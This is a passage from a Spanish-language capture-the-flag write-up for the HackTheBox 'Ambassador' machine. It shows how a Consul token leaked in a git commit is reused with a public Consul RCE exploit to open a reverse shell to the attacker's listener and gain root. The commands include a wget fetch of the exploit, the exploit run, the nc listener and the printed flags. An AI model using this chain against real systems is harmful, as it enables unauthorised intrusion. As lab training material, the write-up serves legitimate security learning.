Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 12 Jun 2023 07:15:55 PM UTC

  System load:           0.06
  Usage of /:            81.6% of 5.07GB
  Memory usage:          41%
  Swap usage:            0%
  Processes:             228
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.183
  IPv6 address for eth0: dead:beef::250:56ff:feb9:60ff

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Fri Sep  2 02:33:30 2022 from 10.10.0.1
developer@ambassador:~$ 
```

## User.txt 

```bash
developer@ambassador:~$ export TERM=xterm
developer@ambassador:~$ ls -la
total 48
drwxr-xr-x 7 developer developer 4096 Sep 14  2022 .
drwxr-xr-x 3 root      root      4096 Mar 13  2022 ..
lrwxrwxrwx 1 root      root         9 Sep 14  2022 .bash_history -> /dev/null
-rw-r--r-- 1 developer developer  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 developer developer 3798 Mar 14  2022 .bashrc
drwx------ 3 developer developer 4096 Mar 13  2022 .cache
-rw-rw-r-- 1 developer developer   93 Sep  2  2022 .gitconfig
drwx------ 3 developer developer 4096 Mar 14  2022 .gnupg
drwxrwxr-x 3 developer developer 4096 Mar 13  2022 .local
-rw-r--r-- 1 developer developer  807 Feb 25  2020 .profile
drwx------ 2 developer developer 4096 Mar 13  2022 .ssh
drwx------ 3 developer developer 4096 Mar 14  2022 snap
-rw-r----- 1 root      developer   33 Jun 12 17:18 user.txt
developer@ambassador:~$ cat user.txt 
47c6a292aa5871120bec0725f4110bf3
developer@ambassador:~$ 
```

## Escalada de Privilegios

Vemos que no tenemos ningún privilegio a nivel de **sudoers**

```bash
developer@ambassador:~$ sudo -l
[sudo] password for developer: 
Sorry, user developer may not run sudo on ambassador.
developer@ambassador:~$ 
```

Si listamos por binarios **SUID** encontramos esto

```bash
developer@ambassador:/$ find \-perm -4000 2>/dev/null | grep -v snap 
./usr/lib/eject/dmcrypt-get-device
./usr/lib/policykit-1/polkit-agent-helper-1
./usr/lib/openssh/ssh-keysign
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/bin/umount
./usr/bin/chsh
./usr/bin/gpasswd
./usr/bin/chfn
./usr/bin/su
./usr/bin/newgrp
./usr/bin/at
./usr/bin/sudo
./usr/bin/mount
./usr/bin/passwd
./usr/bin/fusermount
developer@ambassador:/$ 

```

Bueno vemos algo interesante aquí 

```bash
developer@ambassador:~$ cat .gitconfig 
[user]
	name = Developer
	email = developer@ambassador.local
[safe]
	directory = /opt/my-app
developer@ambassador:~$ 


```

Es un proyecto de `github`

```bash
developer@ambassador:/opt/my-app$ ls -la
total 24
drwxrwxr-x 5 root root 4096 Mar 13  2022 .
drwxr-xr-x 4 root root 4096 Sep  1  2022 ..
drwxrwxr-x 8 root root 4096 Mar 14  2022 .git
-rw-rw-r-- 1 root root 1838 Mar 13  2022 .gitignore
drwxrwxr-x 4 root root 4096 Mar 13  2022 env
drwxrwxr-x 3 root root 4096 Mar 13  2022 whackywidget
developer@ambassador:/opt/my-app$ 

```

Vemos estos `commit`

```bash
developer@ambassador:/opt/my-app$ git log
commit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -> main)
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 23:47:36 2022 +0000

    tidy config script

commit c982db8eff6f10f8f3a7d802f79f2705e7a21b55
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 23:44:45 2022 +0000

    config script

commit 8dce6570187fd1dcfb127f51f147cd1ca8dc01c6
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 22:47:01 2022 +0000

    created project with django CLI

commit 4b8597b167b2fbf8ec35f992224e612bf28d9e51
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 22:44:11 2022 +0000

    .gitignore
developer@ambassador:/opt/my-app$ 
```

Si vemos información del primer `commit` vemos que quito una linea y después se puso otra

```bash
developer@ambassador:/opt/my-app$ git show 33a53ef9a207976d5ceceddc41a199558843bf3c
commit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -> main)
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 23:47:36 2022 +0000

    tidy config script

diff --git a/whackywidget/put-config-in-consul.sh b/whackywidget/put-config-in-consul.sh
index 35c08f6..fc51ec0 100755
--- a/whackywidget/put-config-in-consul.sh
+++ b/whackywidget/put-config-in-consul.sh
@@ -1,4 +1,4 @@
 # We use Consul for application config in production, this script will help set the correct values for the app
-# Export MYSQL_PASSWORD before running
+# Export MYSQL_PASSWORD and CONSUL_HTTP_TOKEN before running
 
-consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD
+consul kv put whackywidget/db/mysql_pw $MYSQL_PASSWORD
developer@ambassador:/opt/my-app$ 
```

Vemos que esta usando `consul`

```bash
developer@ambassador:/opt/my-app$ which consul
/usr/bin/consul
```

![](/assets/images/htb-writeup-ambassador/web9.png)

Esta es la versión

```bash
developer@ambassador:/opt/my-app$ consul -v
Consul v1.13.2
Revision 0e046bbb
Build Date 2022-09-20T20:30:07Z
Protocol 2 spoken by default, understands 2 to 3 (agent will automatically use protocol >2 when speaking to compatible agents)

developer@ambassador:/opt/my-app$ 

```

Existen vulnerabilidades 

```bash
❯ searchsploit consul
---------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                |  Path
---------------------------------------------------------------------------------------------- ---------------------------------
Hashicorp Consul - Remote Command Execution via Rexec (Metasploit)                            | linux/remote/46073.rb
Hashicorp Consul - Remote Command Execution via Services API (Metasploit)                     | linux/remote/46074.rb
Hassan Consulting Shopping Cart 1.18 - Directory Traversal                                    | cgi/remote/20281.txt
Hassan Consulting Shopping Cart 1.23 - Arbitrary Command Execution                            | cgi/remote/21104.pl
PHPLeague 0.81 - '/consult/miniseul.php?cheminmini' Remote File Inclusion                     | php/webapps/28864.txt
---------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Vamos a buscar mas en **Google** y encontramos estos 2 <https://github.com/owalid/consul-rce> <https://github.com/GatoGamer1155/Hashicorp-Consul-RCE-via-API> nos piden un token y cuando vimos mas información sobre el `comit` nos compartían uno el cual fue borrado 

Como el `consul` lo esta corriendo `root` como `root` vamos a ganar acceso

```bash
developer@ambassador:~$ ps faux | grep consul
root        1091  0.4  3.7 794292 74696 ?        Ssl  17:18   0:33 /usr/bin/consul agent -config-dir=/etc/consul.d/config.d -config-file=/etc/consul.d/consul.hcl
develop+    2210  0.0  0.0   8160   720 pts/0    S+   19:37   0:00              \_ grep --color=auto consul
developer@ambassador:~$ 

```

Vamos a usar el del compañero **GatoGamer1155** <https://github.com/GatoGamer1155>

Una vez clonamos el repositorio nos pide lo siguiente

```bash
❯ python3 exploit.py
usage: exploit.py [-h] [--rhost RHOST] [--rport RPORT] --lhost LHOST --lport LPORT --token TOKEN [--ssl]
exploit.py: error: the following arguments are required: --lhost/-lh, --lport/-lp, --token/-tk
```

Ahora vamos a pasar el exploit ala maquina victima

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.183 - - [12/Jun/2023 13:52:41] "GET /exploit.py HTTP/1.1" 200 -
```

```bash
developer@ambassador:/dev/shm$ wget http://10.10.14.9:80/exploit.py
--2023-06-12 19:52:38--  http://10.10.14.9/exploit.py
Connecting to 10.10.14.9:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1409 (1.4K) [text/x-python]
Saving to: ‘exploit.py’

exploit.py                      100%[=======================================================>]   1.38K  --.-KB/s    in 0.03s   

2023-06-12 19:52:39 (47.7 KB/s) - ‘exploit.py’ saved [1409/1409]

developer@ambassador:/dev/shm$ 
```

Vamos a usar el **token** que vimos `bb03b43b-1d81-d62b-24b5-39540ee469b5`

Hay que darle permisos de ejecución al script `chmod +x exploit.py`

Y ejecutamos

```bash
developer@ambassador:/dev/shm$ python3 exploit.py --rhost 127.0.0.1 --rport 8500 --lhost 10.10.14.9 --lport 443 --token bb03b43b-1d81-d62b-24b5-39540ee469b5

[+] Request sent successfully, check your listener

developer@ambassador:/dev/shm$ 
```

Y recibimos le shell 

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.11.183] 35798
bash: cannot set terminal process group (2284): Inappropriate ioctl for device
bash: no job control in this shell
root@ambassador:/# whoami
whoami
root
root@ambassador:/# 
```

## Root.flag 

```bash
root@ambassador:/# cd /root
cd /root
root@ambassador:~# cat root.txt	
cat root.txt 
9f995d4bfc19d338b9565baca040d5ea
root@ambassador:~# 
```
